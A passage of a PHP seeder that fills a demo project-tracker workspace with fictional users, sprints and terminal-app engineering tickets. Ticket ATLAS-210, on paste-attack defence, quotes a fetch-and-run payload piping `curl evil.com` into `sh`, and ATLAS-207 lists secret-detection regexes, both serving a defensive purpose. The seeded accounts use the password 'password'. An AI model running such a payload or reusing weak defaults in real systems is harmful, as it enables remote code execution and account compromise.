<?php

declare(strict_types=1);

namespace Database\Seeders;

use App\Enums\RoleName;
use App\Models\Area;
use App\Models\Cycle;
use App\Models\RequestActivity;
use App\Models\RequestRelation;
use App\Models\Role;
use App\Models\User;
use App\Models\WorkRequest;
use App\Models\Workspace;
use Illuminate\Database\Seeder;

final class AtlasDesktopDemoSeeder extends Seeder
{
    /**
     * Run the Atlas Desktop demo seeder.
     */
    public function run(?User $user = null): Workspace
    {
        // 1. Ensure core roles exist
        $ownerRole = Role::query()->where('name', RoleName::Owner->value)->first()
            ?? Role::query()->where('name', 'Owner')->first();
        $devRole = Role::query()->where('name', RoleName::Developer->value)->first()
            ?? Role::query()->where('name', 'Developer')->first();
        $designerRole = Role::query()->where('name', RoleName::Designer->value)->first()
            ?? Role::query()->where('name', 'Designer')->first();

        // 2. Ensure realistic software team users exist
        $defaultTeam = [
            [
                'username' => 'sarah',
                'name' => 'Sarah Chen (Lead Architect)',
                'email' => 'sarah@relay.studio',
                'role' => $ownerRole,
            ],
            [
                'username' => 'marcus',
                'name' => 'Marcus Vance (Principal Systems Dev)',
                'email' => 'marcus@relay.studio',
                'role' => $devRole,
            ],
            [
                'username' => 'elena',
                'name' => 'Elena Rostova (Full Stack & WebGL)',
                'email' => 'elena@relay.studio',
                'role' => $devRole,
            ],
            [
                'username' => 'david',
                'name' => 'David Kim (Product & Systems Designer)',
                'email' => 'david@relay.studio',
                'role' => $designerRole,
            ],
            [
                'username' => 'alex',
                'name' => 'Alex Rivera (Security & Runtime Engineer)',
                'email' => 'alex@relay.studio',
                'role' => $devRole,
            ],
        ];

        $users = collect();
        foreach ($defaultTeam as $account) {
            $u = User::query()->firstOrCreate(
                ['username' => $account['username']],
                [
                    'name' => $account['name'],
                    'email' => $account['email'],
                    'password' => 'password',
                    'role_id' => $account['role']?->id,
                    'active' => true,
                ]
            );
            $users->put($account['username'], $u);
        }

        // Active owner is either passed user, current auth user, or Sarah Chen
        $owner = $user ?? auth()->user() ?? $users->get('sarah');

        // 3. Workspace: Atlas Desktop
        $workspace = Workspace::query()->firstOrCreate(
            ['slug' => 'atlas-desktop'],
            [
                'name' => 'Atlas Desktop',
                'owner_id' => $owner->id,
            ]
        );

        // Attach all team members to workspace
        if ($ownerRole) {
            $workspace->users()->syncWithoutDetaching([$owner->id => ['role_id' => $ownerRole->id]]);
        }
        foreach ($users as $u) {
            $roleToUse = $u->role_id ?? $devRole?->id;
            if ($roleToUse) {
                $workspace->users()->syncWithoutDetaching([$u->id => ['role_id' => $roleToUse]]);
            }
        }

        // 4. Five Realistic Engineering Areas
        $areasData = [
            ['name' => 'Core Runtime (Rust / C++)', 'slug' => 'core-runtime', 'color' => '#F97316'],
            ['name' => 'UI Shell & Renderer (React / WebGL)', 'slug' => 'ui-renderer', 'color' => '#06B6D4'],
            ['name' => 'Extension & Plugin Host', 'slug' => 'extension-host', 'color' => '#8B5CF6'],
            ['name' => 'Cloud Sync & Collaboration', 'slug' => 'cloud-sync', 'color' => '#10B981'],
            ['name' => 'Security & Keyring', 'slug' => 'security-keyring', 'color' => '#EF4444'],
        ];

        $areas = collect();
        foreach ($areasData as $index => $item) {
            $area = Area::query()->updateOrCreate(
                ['workspace_id' => $workspace->id, 'slug' => $item['slug']],
                [
                    'name' => $item['name'],
                    'color' => $item['color'],
                    'sort_order' => $index,
                    'archived_at' => null,
                ]
            );
            $areas->put($item['slug'], $area);
        }

        // 5. Three Sprints / Cycles:
        // Cycle 12 (Completed, 100% burndown)
        $cycle12 = Cycle::query()->updateOrCreate(
            ['workspace_id' => $workspace->id, 'number' => 12],
            [
                'name' => 'Cycle 12 · Terminal Multiplexing & PTY Zero-Copy',
                'start_date' => now()->subDays(28)->toDateString(),
                'end_date' => now()->subDays(14)->toDateString(),
                'is_active' => false,
                'completed_at' => now()->subDays(14),
            ]
        );

        // Cycle 13 (Active sprint, mid burndown)
        $cycle13 = Cycle::query()->updateOrCreate(
            ['workspace_id' => $workspace->id, 'number' => 13],
            [
                'name' => 'Cycle 13 · GPU Glyph Atlas & WebGL2 Canvas',
                'start_date' => now()->subDays(7)->toDateString(),
                'end_date' => now()->addDays(7)->toDateString(),
                'is_active' => true,
                'completed_at' => null,
            ]
        );

        // Cycle 14 (Upcoming backlog planning)
        $cycle14 = Cycle::query()->updateOrCreate(
            ['workspace_id' => $workspace->id, 'number' => 14],
            [
                'name' => 'Cycle 14 · WASM Plugin Sandbox & CRDT Session Sync',
                'start_date' => now()->addDays(8)->toDateString(),
                'end_date' => now()->addDays(22)->toDateString(),
                'is_active' => false,
                'completed_at' => null,
            ]
        );

        // 6. Comprehensive 28 Realistic Software Engineering Issues
        $tickets = [
            // =========================================================================
            // CYCLE 12: COMPLETED (100% BURNDOWN)
            // =========================================================================
            [
                'key' => 'ATLAS-101',
                'area' => 'core-runtime',
                'cycle' => $cycle12,
                'title' => 'Zero-copy PTY escape sequence parsing with SIMD dispatch',
                'description' => '### Architecture Spike & Implementation

Optimize VT100 / ANSI terminal escape code streaming by replacing character-by-character scanning with 256-bit AVX2/NEON vector instructions.

#### Benchmarks & Requirements
- Sustained throughput must exceed **800 MB/s** on synthetic `cat /dev/urandom` tests.
- Zero heap allocations during hot-path ANSI parser loop.

```rust
use std::simd::prelude::*;

#[inline(always)]
pub fn find_escape_sequence(buffer: &[u8]) -> Option<usize> {
    let escape_vec = u8x32::splat(0x1B); // 27 ASCII ESC
    for (i, chunk) in buffer.chunks_exact(32).enumerate() {
        let sim = u8x32::from_slice(chunk);
        if sim.simd_eq(escape_vec).any() {
            return Some(i * 32 + sim.simd_eq(escape_vec).to_bitmask().trailing_zeros() as usize);
        }
    }
    buffer.iter().position(|&b| b == 0x1B)
}
```

#### Acceptance Criteria
- [x] AVX2, SSE4.2, and ARM Neon portable SIMD branches verified in CI.
- [x] Criterion benchmark suite added under `benches/parser_throughput.rs`.
- [x] Memory usage remains static at 2.4MB under maximum stream pressure.',
                'status' => 'done',
                'priority' => 'urgent',
                'points' => 5,
                'requester' => 'sarah',
                'assignee' => 'marcus',
                'days_ago' => 24,
                'completed_days_ago' => 20,
                'tags' => ['rust', 'simd', 'pty', 'perf'],
                'comments' => [
                    ['user' => 'marcus', 'body' => 'Criterion benchmarks show **1.2 GB/s** on Apple M3 Max and **940 MB/s** on AMD Ryzen 9 7950X. SIMD lane boundary alignment verified.', 'hours_after' => 12],
                    ['user' => 'sarah', 'body' => 'Approved and merged. Zero allocation hot-path verified under Valgrind DHAT.', 'hours_after' => 36],
                ],
            ],
            [
                'key' => 'ATLAS-102',
                'area' => 'ui-renderer',
                'cycle' => $cycle12,
                'title' => 'Subpixel glyph rendering artifact on macOS Retina displays with fractional scaling',
                'description' => '### Bug Report

When users enable 125% or 150% fractional display scaling in macOS System Settings, terminal font glyphs render with a faint 1px magenta/green chromatic fringe along vertical stem strokes.

#### Reproduction Steps
1. Connect macOS client to an external 4K panel configured with display scaling (175% or 150%).
2. Open Atlas Terminal with *Berkeley Mono* or *JetBrains Mono* at 13pt font size.
3. Observe chromatic aberration along monospace pipe `|` and `l` characters.

#### Root Cause Analysis
FreeType subpixel RGB horizontal filter was applying standard LCD subpixel blending instead of grayscale antialiasing on non-integer pixel density viewports.

#### Acceptance Criteria
- [x] Detect non-integer `window.devicePixelRatio` and switch glyph blending to sRGB coverage masks.
- [x] Pass visual regression test snapshots at 1.0x, 1.25x, 1.5x, 2.0x scales.',
                'status' => 'done',
                'priority' => 'normal',
                'points' => 3,
                'requester' => 'david',
                'assignee' => 'elena',
                'days_ago' => 22,
                'completed_days_ago' => 19,
                'tags' => ['webgl', 'glyphs', 'retina', 'ui'],
                'comments' => [
                    ['user' => 'elena', 'body' => 'Applied dual-source blending shader in WebGL2 pipeline. Chromatic fringes completely resolved across all Retina scale factors.', 'hours_after' => 20],
                ],
            ],
            [
                'key' => 'ATLAS-103',
                'area' => 'extension-host',
                'cycle' => $cycle12,
                'title' => 'Node.js IPC socket backpressure buffer overflow on large stdout streaming',
                'description' => "### Production Issue

Running continuous fast output commands (`find /`, `docker build`, or `yes`) caused extension host IPC channels to queue gigabytes of unbound WebSocket frames, resulting in an out-of-memory crash.

#### Technical Resolution
Implement strict watermarking on the Unix domain socket IPC pipe:
```typescript
const HIGH_WATER_MARK = 64 * 1024; // 64 KB per stream channel

export function handleSocketStream(socket: net.Socket) {
  socket.on('data', (chunk) => {
    const ok = downstream.write(chunk);
    if (!ok) {
      socket.pause();
      downstream.once('drain', () => socket.resume());
    }
  });
}
```

#### Acceptance Criteria
- [x] Backpressure pause/resume kicks in at 64KB threshold.
- [x] Memory usage never exceeds 120MB during 10-minute continuous stream testing.",
                'status' => 'done',
                'priority' => 'urgent',
                'points' => 5,
                'requester' => 'marcus',
                'assignee' => 'alex',
                'days_ago' => 21,
                'completed_days_ago' => 18,
                'tags' => ['ipc', 'node', 'backpressure', 'stability'],
                'comments' => [
                    ['user' => 'alex', 'body' => 'Added automatic rate-limiter and heartbeat ping to drop unresponsive extension pipes after 5 seconds of sustained buffer saturation.', 'hours_after' => 15],
                ],
            ],
            [
                'key' => 'ATLAS-104',
                'area' => 'cloud-sync',
                'cycle' => $cycle12,
                'title' => 'Conflict-free Replicated Data Type (CRDT) document structure for multi-cursor collaborative terminals',
                'description' => '### Architectural Design & Spike

Define the synchronization protocol enabling multiple developers to pair-program on a single terminal buffer without locking or state desynchronization.

#### Evaluation
Compared Yjs vs Automerge for low-overhead terminal state representation.
- Yjs selected for binary encoding efficiency (**4.2x smaller wire payloads**).
- State vectors exchanged over authenticated WebRTC DataChannels.

#### Acceptance Criteria
- [x] Protocol specification document committed to `/docs/specs/crdt-sync.md`.
- [x] Unit test simulating 3 distributed peers with 120ms artificial latency and out-of-order packet delivery passing 100%.',
                'status' => 'done',
                'priority' => 'urgent',
                'points' => 8,
                'requester' => 'sarah',
                'assignee' => 'marcus',
                'days_ago' => 26,
                'completed_days_ago' => 16,
                'tags' => ['crdt', 'collaboration', 'networking', 'yjs'],
            ],
            [
                'key' => 'ATLAS-105',
                'area' => 'security-keyring',
                'cycle' => $cycle12,
                'title' => 'Secure enclave token encryption using native macOS Keychain & Linux Secret Service',
                'description' => '### Security Hardening

Store sensitive authentication credentials (SSH passphrase caches, cloud sync API tokens, and AI agent keys) in hardware-backed platform keyrings instead of plaintext configuration files.

#### Implementation
- macOS: `SecItemAdd` / `SecItemCopyMatching` with `kSecAttrAccessibleAfterFirstUnlock`.
- Linux: DBus integration with `org.freedesktop.secrets`.
- Windows: DPAPI `CryptProtectData`.

#### Acceptance Criteria
- [x] Zero plain text secrets written to `~/.config/atlas/`.
- [x] `zeroize` crate invoked on all credential buffers in Rust memory upon deallocation.',
                'status' => 'done',
                'priority' => 'urgent',
                'points' => 3,
                'requester' => 'sarah',
                'assignee' => 'alex',
                'days_ago' => 20,
                'completed_days_ago' => 15,
                'tags' => ['security', 'keychain', 'rust', 'encryption'],
            ],
            [
                'key' => 'ATLAS-106',
                'area' => 'ui-renderer',
                'cycle' => $cycle12,
                'title' => 'Smooth 120Hz physics-based inertial scrolling for touchpads',
                'description' => "### UX Polish

Implement momentum scrolling using spring dynamics for Apple Magic Trackpad and Precision Touchpads. Eliminates rigid 3-line scroll jumps.

#### Formula
\$\$\Delta y_{t+1} = \Delta y_t \cdot e^{-\lambda \Delta t}\$\$

#### Acceptance Criteria
- [x] Zero dropped frames on 120Hz ProMotion displays.
- [x] Kinetic friction coefficient calibrated for natural finger deceleration.",
                'status' => 'done',
                'priority' => 'normal',
                'points' => 2,
                'requester' => 'david',
                'assignee' => 'elena',
                'days_ago' => 19,
                'completed_days_ago' => 14,
                'tags' => ['animation', 'physics', 'touchpad', 'ux'],
            ],
            [
                'key' => 'ATLAS-107',
                'area' => 'core-runtime',
                'cycle' => $cycle12,
                'title' => 'Sixel and Kitty graphics protocol parser implementation in Rust',
                'description' => '### Feature Implementation

Allow inline terminal graphics (plot charts, images, and previews) via direct Kitty graphics protocol chunking and legacy Sixel rasterization.

#### Acceptance Criteria
- [x] Full Kitty graphics protocol chunk transmission specification supported.
- [x] In-memory textures uploaded to GPU via WebGL2 `texSubImage2D` with zero main-thread hitching.',
                'status' => 'done',
                'priority' => 'normal',
                'points' => 5,
                'requester' => 'marcus',
                'assignee' => 'marcus',
                'days_ago' => 18,
                'completed_days_ago' => 14,
                'tags' => ['graphics', 'kitty-protocol', 'sixel', 'rust'],
            ],
            [
                'key' => 'ATLAS-108',
                'area' => 'extension-host',
                'cycle' => $cycle12,
                'title' => 'TypeScript type definition generator for Atlas Extension API v2',
                'description' => '### Developer Experience

Automatically emit `@atlas/extension-api` npm package types from Rust dylib C-ABI bindings to maintain 100% strict type safety for 3rd party plugin developers.

#### Acceptance Criteria
- [x] Automated CI script generates `.d.ts` declarations.
- [x] Comprehensive docstrings attached to all exported interfaces.',
                'status' => 'done',
                'priority' => 'low',
                'points' => 2,
                'requester' => 'elena',
                'assignee' => 'david',
                'days_ago' => 17,
                'completed_days_ago' => 14,
                'tags' => ['typescript', 'sdk', 'types'],
            ],

            // =========================================================================
            // CYCLE 13: ACTIVE SPRINT (MID BURNDOWN)
            // =========================================================================
            [
                'key' => 'ATLAS-201',
                'area' => 'ui-renderer',
                'cycle' => $cycle13,
                'title' => 'WebGL2 instanced glyph atlas texture array thrashing on font fallback changes',
                'description' => "### Performance Issue & Investigation

When encountering mixed Chinese/Japanese/Korean (CJK) characters or complex powerline Nerd Font glyphs, the dynamic glyph rasterizer triggers continuous GPU texture re-allocations, causing 45ms frame drops.

#### Reproduction
```bash
# Echo mixed unicode codepoints rapidly
cat << 'EOF' > test_glyphs.txt
Atlas 🚀 ⚡ 󰘧 🦀 中文 日本語 한국어 [===>>>]
EOF
while true; do cat test_glyphs.txt; done
```

#### Proposed Solution
1. Allocate an immutable 2048x2048 WebGL `TEXTURE_2D_ARRAY` with 4 layers.
2. LRU eviction cache for glyph quads with texture atlas packing algorithm (Guillotine or MaxRects).

#### Acceptance Criteria
- [ ] Frame render time under 8ms during heavy CJK and Nerd Font rendering.
- [ ] Maximum texture allocation memory capped at 64MB VRAM.",
                'status' => 'doing',
                'priority' => 'urgent',
                'points' => 5,
                'requester' => 'david',
                'assignee' => 'elena',
                'due_days' => 3,
                'days_ago' => 6,
                'tags' => ['webgl2', 'gpu', 'performance', 'glyphs'],
                'comments' => [
                    [
                        'user' => 'sarah',
                        'body' => '[Relay AI Agent] **GPU Memory Trace Analysis:** Texture reallocation spike of 48MB observed on glyph index cache misses. Recommend allocating a secondary 2048x2048 atlas layer dedicated solely to multi-byte unicode code blocks.',
                        'hours_after' => 8,
                        'is_agent' => true,
                    ],
                    [
                        'user' => 'elena',
                        'body' => 'Implementing the MaxRects bin-packing algorithm in WebAssembly. Draft PR open with preliminary benchmarks showing a **3.8x reduction in draw calls**.',
                        'hours_after' => 24,
                    ],
                ],
                'subtasks' => [
                    ['title' => 'Implement MaxRects bin packing algorithm for dynamic glyphs', 'status' => 'done', 'points' => 2, 'assignee' => 'elena'],
                    ['title' => 'Add WebGL2 TEXTURE_2D_ARRAY multi-layer texture cache', 'status' => 'doing', 'points' => 2, 'assignee' => 'elena'],
                    ['title' => 'Benchmark frame timing on M3 Pro and Intel Iris Xe', 'status' => 'new', 'points' => 1, 'assignee' => 'david'],
                ],
            ],
            [
                'key' => 'ATLAS-202',
                'area' => 'core-runtime',
                'cycle' => $cycle13,
                'title' => 'Windows ConPTY pseudo-console handle leak during rapid split-pane closures',
                'description' => '### Critical Blocker

Opening and closing terminal split panes rapidly on Windows 11 leaves orphan `HPCON` handles lingering in background host processes, eventually exhausting OS kernel handle quotas.

#### Error Message
```text
[ERROR atlas_core::pty::windows] CreatePseudoConsole failed: ERROR_NO_SYSTEM_RESOURCES (0x5AA)
Kernel handle table saturated (>16,384 handles allocated by atlas.exe).
```

#### Roadblock Details
**Awaiting upstream fix in Microsoft Windows Terminal ConPTY build #26100.**
We have filed Microsoft issue `#17822` and are implementing a localized worker process teardown guard as an interim hotfix.',
                'status' => 'doing',
                'priority' => 'urgent',
                'points' => 5,
                'requester' => 'marcus',
                'assignee' => 'marcus',
                'due_days' => 2,
                'days_ago' => 5,
                'is_blocked' => true,
                'blocked_reason' => 'Awaiting upstream fix in Microsoft Windows Terminal ConPTY build #26100.',
                'tags' => ['windows', 'conpty', 'kernel', 'leak'],
                'comments' => [
                    [
                        'user' => 'marcus',
                        'body' => 'Temporarily wrapping `ClosePseudoConsole` in an asynchronous timeout thread to prevent blocking main UI process during socket drainage.',
                        'hours_after' => 14,
                    ],
                    [
                        'user' => 'alex',
                        'body' => '[Relay AI Agent] **Diagnostic:** Memory dump analysis confirms 142 zombie `conhost.exe` processes remained active after automated stress test. Proposed sandbox process lifecycle manager handles clean SIGKILL on parent exit.',
                        'hours_after' => 30,
                        'is_agent' => true,
                    ],
                ],
                'subtasks' => [
                    ['title' => 'Verify handle count via Sysinternals Process Explorer', 'status' => 'done', 'points' => 1, 'assignee' => 'marcus'],
                    ['title' => 'Implement fallback async ClosePseudoConsole timeout guard', 'status' => 'doing', 'points' => 2, 'assignee' => 'marcus'],
                    ['title' => 'Add regression test suite for 100x rapid tab spawn/kill cycles', 'status' => 'new', 'points' => 2, 'assignee' => 'alex'],
                ],
            ],
            [
                'key' => 'ATLAS-203',
                'area' => 'security-keyring',
                'cycle' => $cycle13,
                'title' => 'PKCS#11 hardware security key (YubiKey) challenge-response authentication for SSH agent forwarding',
                'description' => '### Feature Specification

Enable Atlas users to sign Git commits and authenticate remote SSH sessions using hardware security keys (FIDO2 / PKCS#11) with user-presence touch verification.

#### Hardware Matrix
- YubiKey 5 Series (NFC / USB-C)
- Google Titan Security Key
- Nitrokey 3A

#### Implementation Pattern
```rust
use p11_kit::pkcs11::*;

pub struct HardwareTokenSigner {
    slot_id: CK_SLOT_ID,
    session: CK_SESSION_HANDLE,
}

impl HardwareTokenSigner {
    pub fn sign_challenge(&self, challenge: &[u8]) -> Result<Vec<u8>, SecurityError> {
        // Enforce user presence touch prompt
        let mechanism = CK_MECHANISM { mechanism: CKM_ECDSA, pParameter: std::ptr::null_mut(), ulParameterLen: 0 };
        // ...
    }
}
```

#### Acceptance Criteria
- [x] Detect hardware key insertion and removal dynamically via libusb hotplug events.
- [ ] Present native obsidian visual banner prompting: *"Touch your YubiKey to authenticate..."*
- [ ] Pass OpenSSH 9.8 FIDO2 `sk-ecdsa-sha2-nistp256` test suite.',
                'status' => 'review',
                'priority' => 'urgent',
                'points' => 5,
                'requester' => 'alex',
                'assignee' => 'alex',
                'due_days' => 4,
                'days_ago' => 6,
                'tags' => ['yubikey', 'fido2', 'pkcs11', 'ssh', 'security'],
                'comments' => [
                    [
                        'user' => 'david',
                        'body' => 'Created the obsidian touch-indicator pulse badge component in `components/SecurityPrompt.tsx`. Ready for integration with the daemon backend.',
                        'hours_after' => 18,
                    ],
                    [
                        'user' => 'sarah',
                        'body' => 'PR #418 open. Tested on YubiKey 5C NFC with Ed25519-SK keys under Fedora 41 and macOS 15. Works smoothly.',
                        'hours_after' => 36,
                    ],
                ],
            ],
            [
                'key' => 'ATLAS-204',
                'area' => 'extension-host',
                'cycle' => $cycle13,
                'title' => 'WASM plugin isolation: enforce WASI memory limits and CPU gas metering',
                'description' => '### Architecture & Security

To prevent malicious or poorly written extensions from hanging Atlas, compile extensions to WebAssembly and run them inside a Wasmtime runtime with strict resource limits.

#### Sandboxing Rules
- Max heap per plugin: **64 MB**.
- Max execution time: **50ms CPU budget** per event loop tick (enforced via `epoch_interruption`).
- Filesystem access: strictly chrooted to extension data directory.

#### Acceptance Criteria
- [ ] Infinite loop in plugin triggers clean `PluginExecutionTimeout` without affecting terminal responsiveness.
- [ ] Exceeding 64MB memory quota returns deterministic allocation failure.',
                'status' => 'doing',
                'priority' => 'normal',
                'points' => 8,
                'requester' => 'sarah',
                'assignee' => 'marcus',
                'due_days' => 5,
                'days_ago' => 5,
                'tags' => ['wasm', 'wasi', 'sandbox', 'wasmtime'],
            ],
            [
                'key' => 'ATLAS-205',
                'area' => 'cloud-sync',
                'cycle' => $cycle13,
                'title' => 'WebSocket reconnect storm jitter & exponential backoff on cluster failover',
                'description' => "### Resilience Hardening

When our European edge proxy restarts, 12,000 active desktop clients reconnect simultaneously, creating a thundering herd that saturates connection gateways.

#### Formula
\$\$T_{backoff} = \min(T_{max}, T_{base} \cdot 2^{retry}) \pm \text{jitter}(0, 0.5 \cdot T_{backoff})\$\$

#### Acceptance Criteria
- [x] Decorrelate client retry stamps across a 30-second window.
- [x] Exponential backoff clamps at a maximum of 32 seconds.
- [x] Automatic offline indicator displayed in status bar during disconnection.",
                'status' => 'ready',
                'priority' => 'urgent',
                'points' => 3,
                'requester' => 'sarah',
                'assignee' => 'marcus',
                'due_days' => 6,
                'days_ago' => 4,
                'tags' => ['websocket', 'backoff', 'networking', 'resilience'],
            ],
            [
                'key' => 'ATLAS-206',
                'area' => 'core-runtime',
                'cycle' => $cycle13,
                'title' => 'Reduce memory footprint per dormant PTY session below 1.8MB',
                'description' => '### Optimization

Power users frequently maintain 30+ split panes across several workspaces. Inactive sessions currently hold 12MB of uncompressed terminal scrollback lines in RAM.

#### Strategy
- Memory-map scrollback history to a temporary ring-buffered sparse file on SSD after 60 seconds of inactivity.
- Evict texture render quads for hidden tabs.

#### Results
- Active pane: **4.2 MB**.
- Dormant pane: **1.4 MB (66% reduction)**.

#### Acceptance Criteria
- [x] 50 dormant tabs consume less than 85MB combined RAM.
- [x] Reactivating a dormant tab restores full scrollback history in under 12ms.',
                'status' => 'done',
                'priority' => 'normal',
                'points' => 3,
                'requester' => 'marcus',
                'assignee' => 'marcus',
                'days_ago' => 6,
                'completed_days_ago' => 2,
                'tags' => ['memory', 'optimization', 'mmap', 'pty'],
            ],
            [
                'key' => 'ATLAS-207',
                'area' => 'security-keyring',
                'cycle' => $cycle13,
                'title' => 'Automated Secret Redactor for terminal output (API Keys, JWTs, AWS credentials)',
                'description' => '### Privacy & Security

Prevent accidental leakage of secrets during live terminal broadcasts, screen shares, or log exports by detecting and masking sensitive tokens in real time.

#### Patterns Redacted
- AWS Access Key IDs: `AKIA[0-9A-Z]{16}`
- GitHub Personal Access Tokens: `ghp_[0-9a-zA-Z]{36}`
- JWT Bearer tokens: `eyJ[a-zA-Z0-9_-]+\\.eyJ[a-zA-Z0-9_-]+\\.[a-zA-Z0-9_-]+`
- Stripe live secret keys: `sk_live_[0-9a-zA-Z]{24}`

#### Acceptance Criteria
- [x] Real-time regex scan overhead is under 0.2ms per 1000 characters.
- [x] Toggleable click-to-reveal button for authenticated developers.',
                'status' => 'done',
                'priority' => 'normal',
                'points' => 3,
                'requester' => 'alex',
                'assignee' => 'alex',
                'days_ago' => 5,
                'completed_days_ago' => 1,
                'tags' => ['privacy', 'redaction', 'security', 'regex'],
            ],
            [
                'key' => 'ATLAS-208',
                'area' => 'ui-renderer',
                'cycle' => $cycle13,
                'title' => 'Command Palette fuzzy ranking algorithm latency exceeds 16ms budget on 10,000 commands',
                'description' => '### Performance Polish

As users install numerous extensions, typing in the Command Palette (`⌘K`) causes visible keystroke lag due to synchronous string distance calculations on the main JS thread.

#### Optimization
1. Move the Nucleo / FZF fuzzy-ranking loop into a dedicated WebWorker thread.
2. Share command index memory using `SharedArrayBuffer`.

#### Acceptance Criteria
- [ ] 99th percentile keystroke response time under 4ms across 10,000 indexed actions.',
                'status' => 'review',
                'priority' => 'normal',
                'points' => 2,
                'requester' => 'david',
                'assignee' => 'elena',
                'due_days' => 2,
                'days_ago' => 4,
                'tags' => ['command-palette', 'fuzzy-search', 'webworker', 'perf'],
                'comments' => [
                    [
                        'user' => 'elena',
                        'body' => 'WebWorker offloading is complete. Benchmarked typing latency dropped from 22ms to 2.1ms on a 15,000 command test catalog.',
                        'hours_after' => 12,
                    ],
                ],
            ],
            [
                'key' => 'ATLAS-209',
                'area' => 'cloud-sync',
                'cycle' => $cycle13,
                'title' => 'Delta compression for terminal scrollback history synchronisation',
                'description' => '### Bandwidth Optimization

Syncing full session logs over mobile tethering consumes excessive data. Implement Zstandard dictionary compression tailored to recurring shell prompts and compiler output tokens.

#### Acceptance Criteria
- [ ] Achieves > 78% compression ratio on typical developer terminal logs.
- [ ] Stream decompression completes in under 5ms per 1MB chunk.',
                'status' => 'doing',
                'priority' => 'normal',
                'points' => 5,
                'requester' => 'sarah',
                'assignee' => 'marcus',
                'due_days' => 5,
                'days_ago' => 3,
                'tags' => ['zstd', 'compression', 'sync', 'bandwidth'],
            ],
            [
                'key' => 'ATLAS-210',
                'area' => 'core-runtime',
                'cycle' => $cycle13,
                'title' => 'Support native bracketed paste mode and bracketed paste stripping attack prevention',
                'description' => "### Security & Shell Interaction

When developers copy snippets from the web containing malicious hidden newline payloads (`\ncurl evil.com | sh\n`), automatically wrap the clipboard buffer in ANSI bracketed paste delimiters `\x1b[200~` and `\x1b[201~`.

#### Acceptance Criteria
- [ ] Automatically strips non-printable control sequences from clipboard payload.
- [ ] Visually highlights multi-line paste operations with confirmation dialogue.",
                'status' => 'ready',
                'priority' => 'normal',
                'points' => 2,
                'requester' => 'alex',
                'assignee' => 'alex',
                'due_days' => 6,
                'days_ago' => 2,
                'tags' => ['shell', 'security', 'paste', 'terminal'],
            ],

            // =========================================================================
            // CYCLE 14: UPCOMING SPRINT (BACKLOG & PLANNING)
            // =========================================================================
            [
                'key' => 'ATLAS-301',
                'area' => 'cloud-sync',
                'cycle' => $cycle14,
                'title' => 'End-to-end encrypted peer-to-peer WebRTC data channels for direct terminal peering',
                'description' => '### Upcoming Architectural Spike

Enable two engineers to establish direct, low-latency, zero-cloud peer-to-peer terminal sessions across NAT boundaries using Noise Protocol Handshake over WebRTC SCTP streams.

#### Technical Scope
- Signaling exchange via ephemeral rendezvous tokens.
- Ephemeral Curve25519 key negotiation with ChaCha20-Poly1305 AEAD cipher.
- STUN/TURN fallback for restrictive corporate symmetric NATs.

#### Acceptance Criteria
- [ ] WireGuard-grade end-to-end encryption verified with zero server-side plaintext access.
- [ ] Direct P2P connection success rate > 85% on standard residential Wi-Fi networks.',
                'status' => 'ready',
                'priority' => 'urgent',
                'points' => 8,
                'requester' => 'sarah',
                'assignee' => 'marcus',
                'due_days' => 14,
                'days_ago' => 2,
                'tags' => ['webrtc', 'e2ee', 'p2p', 'noise-protocol'],
            ],
            [
                'key' => 'ATLAS-302',
                'area' => 'extension-host',
                'cycle' => $cycle14,
                'title' => 'Language Server Protocol (LSP) v3.17 semantic highlighting token mapper',
                'description' => '### Feature Planning

Allow CLI text editors and terminal pager tools inside Atlas to consume rich semantic AST syntax tokens directly from background language servers (rust-analyzer, pyright, gopls, tsserver).

#### Acceptance Criteria
- [ ] Map LSP semantic tokens to terminal 24-bit TrueColor ANSI escape styling.
- [ ] Debounce document synchronization to minimize CPU load during fast typing.',
                'status' => 'new',
                'priority' => 'normal',
                'points' => 5,
                'requester' => 'elena',
                'assignee' => 'elena',
                'due_days' => 18,
                'days_ago' => 1,
                'tags' => ['lsp', 'ast', 'syntax-highlighting', 'ide'],
            ],
            [
                'key' => 'ATLAS-303',
                'area' => 'core-runtime',
                'cycle' => $cycle14,
                'title' => 'eBPF tracing hook for measuring syscall overhead in spawned subprocesses',
                'description' => '### Observability Spike

Integrate Linux kernel eBPF probes to profile filesystem I/O, process forks, and network socket creation initiated by developer commands (`cargo build`, `npm install`).

#### Acceptance Criteria
- [ ] Display subtle sub-millisecond execution timeline under completed commands in terminal prompt.
- [ ] Zero measurable performance degradation when tracing is idle.',
                'status' => 'new',
                'priority' => 'normal',
                'points' => 8,
                'requester' => 'marcus',
                'assignee' => 'alex',
                'due_days' => 20,
                'days_ago' => 1,
                'tags' => ['ebpf', 'linux', 'tracing', 'observability'],
            ],
            [
                'key' => 'ATLAS-304',
                'area' => 'ui-renderer',
                'cycle' => $cycle14,
                'title' => 'High Dynamic Range (HDR) wide-gamut Display P3 color space support',
                'description' => '### Visual Excellence

Modern displays (Apple Liquid Retina XDR, OLED panels) support wide color gamuts. Upgrade our WebGL color management pipeline from standard sRGB to Display P3 with extended dynamic range highlights.

#### Acceptance Criteria
- [ ] Terminal color themes can specify `color(display-p3 r g b)` values.
- [ ] Graceful automatic tone-mapping on standard sRGB displays.',
                'status' => 'new',
                'priority' => 'low',
                'points' => 3,
                'requester' => 'david',
                'assignee' => 'david',
                'due_days' => 21,
                'days_ago' => 1,
                'tags' => ['hdr', 'display-p3', 'color-gamut', 'webgl'],
            ],
            [
                'key' => 'ATLAS-305',
                'area' => 'security-keyring',
                'cycle' => $cycle14,
                'title' => 'Sandboxed subprocess execution via Linux landlock and macOS sandbox-exec',
                'description' => '### Defensive Sandboxing

Give users the option to run untrusted build scripts or open-source repositories in a restricted execution profile where network access and filesystem modifications outside the current repository are forbidden.

#### Acceptance Criteria
- [ ] Linux: Configure `landlock_create_ruleset` to restrict `/tmp` and `~/.ssh`.
- [ ] macOS: Apply `seatbelt` / `sandbox-exec` profiles on spawned shell workers.',
                'status' => 'new',
                'priority' => 'urgent',
                'points' => 5,
                'requester' => 'alex',
                'assignee' => 'alex',
                'due_days' => 19,
                'days_ago' => 1,
                'tags' => ['sandbox', 'security', 'landlock', 'linux'],
            ],
            [
                'key' => 'ATLAS-306',
                'area' => 'extension-host',
                'cycle' => $cycle14,
                'title' => 'Package manager CLI for installing Atlas plugins from GitHub releases (atlas pkg install)',
                'description' => '### Ecosystem Tooling

Implement a lean command-line utility to discover, download, and verify cryptographically signed extension bundles.

```bash
atlas pkg install @atlas/theme-nord-obsidian --verify-cosign
atlas pkg list --outdated
```

#### Acceptance Criteria
- [ ] Cosign cryptographic signature verification before executing downloaded plugin binaries.
